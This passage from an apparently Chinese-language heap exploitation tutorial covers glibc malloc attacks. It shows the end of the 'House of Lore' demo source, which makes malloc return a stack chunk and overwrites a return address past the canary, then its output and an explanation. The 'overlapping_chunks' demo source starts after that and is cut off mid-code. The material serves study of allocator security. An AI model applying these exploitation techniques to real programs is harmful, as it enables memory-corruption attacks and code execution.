</span></span><span class=line><span class=cl>  <span class=c1>// victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>intptr_t</span> <span class=o>*</span><span class=n>victim_chunk</span> <span class=o>=</span> <span class=n>victim</span><span class=o>-</span><span class=mi>2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;stack_buffer_1 at %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=p>(</span><span class=kt>void</span><span class=o>*</span><span class=p>)</span><span class=n>stack_buffer_1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;stack_buffer_2 at %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=p>(</span><span class=kt>void</span><span class=o>*</span><span class=p>)</span><span class=n>stack_buffer_2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Create a fake chunk on the stack</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted&#34;</span>
</span></span><span class=line><span class=cl>         <span class=s>&#34;in second to the last malloc, which putting stack address on smallbin list</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>stack_buffer_1</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>stack_buffer_1</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>stack_buffer_1</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>=</span> <span class=n>victim_chunk</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 &#34;</span>
</span></span><span class=line><span class=cl>         <span class=s>&#34;in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake&#34;</span>
</span></span><span class=line><span class=cl>         <span class=s>&#34;chunk on stack&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>stack_buffer_1</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=n>intptr_t</span><span class=o>*</span><span class=p>)</span><span class=n>stack_buffer_2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>stack_buffer_2</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=n>intptr_t</span><span class=o>*</span><span class=p>)</span><span class=n>stack_buffer_1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Allocating another large chunk in order to avoid consolidating the top chunk with&#34;</span>
</span></span><span class=line><span class=cl>         <span class=s>&#34;the small one during the free()</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=kt>void</span> <span class=o>*</span><span class=n>p5</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mi>1000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Allocated the large chunk on the heap at %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>p5</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Freeing the chunk %p, it will be inserted in the unsorted bin</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>victim</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>free</span><span class=p>((</span><span class=kt>void</span><span class=o>*</span><span class=p>)</span><span class=n>victim</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>In the unsorted bin the victim&#39;s fwd and bk pointers are nil</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;victim-&gt;fwd: %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span><span class=n>victim</span><span class=p>[</span><span class=mi>0</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>  <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;victim-&gt;bk: %p</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span><span class=n>victim</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Now performing a malloc that can&#39;t be handled by the UnsortedBin, nor the small bin</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;This means that the chunk %p will be inserted in front of the SmallBin</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>victim</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kt>void</span> <span class=o>*</span><span class=n>p2</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mi>1200</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;The chunk that can&#39;t be handled by the unsorted bin, nor the SmallBin has been allocated to %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>p2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;The victim chunk has been sorted and its fwd and bk pointers updated</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;victim-&gt;fwd: %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span><span class=n>victim</span><span class=p>[</span><span class=mi>0</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>  <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;victim-&gt;bk: %p</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span><span class=n>victim</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=c1>//------------VULNERABILITY-----------
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>victim</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=n>intptr_t</span><span class=p>)</span><span class=n>stack_buffer_1</span><span class=p>;</span> <span class=c1>// victim-&gt;bk is pointing to stack
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=c1>//------------------------------------
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Now allocating a chunk with size equal to the first one freed</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kt>void</span> <span class=o>*</span><span class=n>p3</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mi>100</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=o>*</span><span class=n>p4</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mi>100</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;p4 = malloc(100)</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>The fwd pointer of stack_buffer_2 has changed after the last malloc to %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>         <span class=n>stack_buffer_2</span><span class=p>[</span><span class=mi>2</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>p4 is %p and should be on the stack!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>p4</span><span class=p>);</span> <span class=c1>// this chunk will be allocated on stack
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>intptr_t</span> <span class=n>sc</span> <span class=o>=</span> <span class=p>(</span><span class=n>intptr_t</span><span class=p>)</span><span class=n>jackpot</span><span class=p>;</span> <span class=c1>// Emulating our in-memory shellcode
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>memcpy</span><span class=p>((</span><span class=n>p4</span><span class=o>+</span><span class=mi>40</span><span class=p>),</span> <span class=o>&amp;</span><span class=n>sc</span><span class=p>,</span> <span class=mi>8</span><span class=p>);</span> <span class=c1>// This bypasses stack-smash detection since it jumps over the canary
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>输出：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Welcome to the House of Lore
</span></span><span class=line><span class=cl>This is a revisited version that bypass also the hardening check introduced by glibc malloc
</span></span><span class=line><span class=cl>This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Allocating the victim chunk
</span></span><span class=line><span class=cl>Allocated the first small chunk on the heap at 0x2006010
</span></span><span class=line><span class=cl>stack_buffer_1 at 0x7ffd3c0b7460
</span></span><span class=line><span class=cl>stack_buffer_2 at 0x7ffd3c0b7440
</span></span><span class=line><span class=cl>Create a fake chunk on the stack
</span></span><span class=line><span class=cl>Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corruptedin second to the last malloc, which putting stack address on smallbin list
</span></span><span class=line><span class=cl>Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake chunk on stackAllocating another large chunk in order to avoid consolidating the top chunk withthe small one during the free()
</span></span><span class=line><span class=cl>Allocated the large chunk on the heap at 0x2006080
</span></span><span class=line><span class=cl>Freeing the chunk 0x2006010, it will be inserted in the unsorted bin
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>In the unsorted bin the victim&#39;s fwd and bk pointers are nil
</span></span><span class=line><span class=cl>victim-&gt;fwd: (nil)
</span></span><span class=line><span class=cl>victim-&gt;bk: (nil)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Now performing a malloc that can&#39;t be handled by the UnsortedBin, nor the small bin
</span></span><span class=line><span class=cl>This means that the chunk 0x2006010 will be inserted in front of the SmallBin
</span></span><span class=line><span class=cl>The chunk that can&#39;t be handled by the unsorted bin, nor the SmallBin has been allocated to 0x2006470
</span></span><span class=line><span class=cl>The victim chunk has been sorted and its fwd and bk pointers updated
</span></span><span class=line><span class=cl>victim-&gt;fwd: 0x7fddc3aecbd8
</span></span><span class=line><span class=cl>victim-&gt;bk: 0x7fddc3aecbd8
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer
</span></span><span class=line><span class=cl>Now allocating a chunk with size equal to the first one freed
</span></span><span class=line><span class=cl>This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer
</span></span><span class=line><span class=cl>This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk
</span></span><span class=line><span class=cl>p4 = malloc(100)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>The fwd pointer of stack_buffer_2 has changed after the last malloc to 0x7fddc3aecbd8
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>p4 is 0x7ffd3c0b7470 and should be on the stack!
</span></span><span class=line><span class=cl>Nice jump d00d
</span></span></code></pre></td></tr></table></div></div><p>逻辑还是比较简单的，就是通过修改栈变量以及堆上 small chunk <code>victim</code> 的 <code>bk</code> 指针构造出一条完整的双向链表，以通过 small bin 检查从而使得 <code>malloc</code> 返回一个栈上地址。注意中间关键的一步是申请了一个不能被 unsorted bin 和 small bin 满足的 chunk，因此只能从 top chunk 切割，这时原本在 unsorted bin 中的 <code>victim</code> 就进入了 small bin。</p><h2 id=overlapping_chunks>overlapping_chunks</h2><p>源码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm> A simple tale of overlapping chunk.
</span></span></span><span class=line><span class=cl><span class=cm> This technique is taken from
</span></span></span><span class=line><span class=cl><span class=cm> http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>*/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdint.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span> <span class=p>,</span> <span class=kt>char</span><span class=o>*</span> <span class=n>argv</span><span class=p>[]){</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>intptr_t</span> <span class=o>*</span><span class=n>p1</span><span class=p>,</span><span class=o>*</span><span class=n>p2</span><span class=p>,</span><span class=o>*</span><span class=n>p3</span><span class=p>,</span><span class=o>*</span><span class=n>p4</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>This is a simple chunks overlapping problem</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Let&#39;s start to allocate 3 chunks on the heap</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>p1</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x100</span> <span class=o>-</span> <span class=mi>8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>p2</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x100</span> <span class=o>-</span> <span class=mi>8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>p3</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x80</span> <span class=o>-</span> <span class=mi>8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;The 3 chunks have been allocated here:</span><span class=se>\n</span><span class=s>p1=%p</span><span class=se>\n</span><span class=s>p2=%p</span><span class=se>\n</span><span class=s>p3=%p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>p1</span><span class=p>,</span> <span class=n>p2</span><span class=p>,</span> <span class=n>p3</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>memset</span><span class=p>(</span><span class=n>p1</span><span class=p>,</span><span class=sc>&#39;1&#39;</span><span class=p>,</span> <span class=mh>0x100</span> <span class=o>-</span> <span class=mi>8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>memset</span><span class=p>(</span><span class=n>p2</span><span class=p>,</span><span class=sc>&#39;2&#39;</span><span class=p>,</span> <span class=mh>0x100</span> <span class=o>-</span> <span class=mi>8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>memset</span><span class=p>(</span><span class=n>p3</span><span class=p>,</span><span class=sc>&#39;3&#39;</span><span class=p>,</span> <span class=mh>0x80</span> <span class=o>-</span> <span class=mi>8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>Now let&#39;s free the chunk p2</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>free</span><span class=p>(</span><span class=n>p2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;The chunk p2 is now in the unsorted bin ready to serve possible</span><span class=se>\n</span><span class=s>new malloc() of its size</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Now let&#39;s simulate an overflow that can overwrite the size of the</span><span class=se>\n</span><span class=s>chunk freed p2.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;For a toy program, the value of the last 3 bits is unimportant;&#34;</span>
</span></span><span class=line><span class=cl>		<span class=s>&#34;however, it is best to maintain the stability of the heap.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;To achieve this stability we will mark the least signifigant bit as 1 (prev_inuse),&#34;</span>
</span></span><span class=line><span class=cl>		<span class=s>&#34;to assure that p1 is not mistaken for a free chunk.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=kt>int</span> <span class=n>evil_chunk_size</span> <span class=o>=</span> <span class=mh>0x181</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=kt>int</span> <span class=n>evil_region_size</span> <span class=o>=</span> <span class=mh>0x180</span> <span class=o>-</span> <span class=mi>8</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;We are going to set the size of chunk p2 to to %d, which gives us</span><span class=se>\n</span><span class=s>a region size of %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		 <span class=n>evil_chunk_size</span><span class=p>,</span> <span class=n>evil_region_size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=o>*</span><span class=p>(</span><span class=n>p2</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=o>=</span> <span class=n>evil_chunk_size</span><span class=p>;</span> <span class=c1>// we are overwriting the &#34;size&#34; field of chunk p2
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>Now let&#39;s allocate another chunk with a size equal to the data</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>	       <span class=s>&#34;size of the chunk p2 injected size</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;This malloc will be served from the previously freed chunk that</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>	       <span class=s>&#34;is parked in the unsorted bin which size has been modified by us</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>p4</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=n>evil_region_size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>p4 has been allocated at %p and ends at %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>p4</span><span class=p>,</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>p4</span><span class=o>+</span><span class=n>evil_region_size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;p3 starts at %p and ends at %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>p3</span><span class=p>,</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>p3</span><span class=o>+</span><span class=mh>0x80</span><span class=o>-</span><span class=mi>8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;p4 should overlap with p3, in this case p4 includes all p3.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>Now everything copied inside chunk p4 can overwrites data on</span><span class=se>\n</span><span class=s>chunk p3,&#34;</span>
</span></span><span class=line><span class=cl>		<span class=s>&#34;and data written to chunk p3 can overwrite data</span><span class=se>\n</span><span class=s>stored in the p4 chunk.</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Let&#39;s run through an example. Right now, we have:</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;p4 = %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>p4</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;p3 = %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>p3</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>If we memset(p4,&#39;4&#39;, %d), we have:</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>evil_region_size</span><span class=p>);</span>
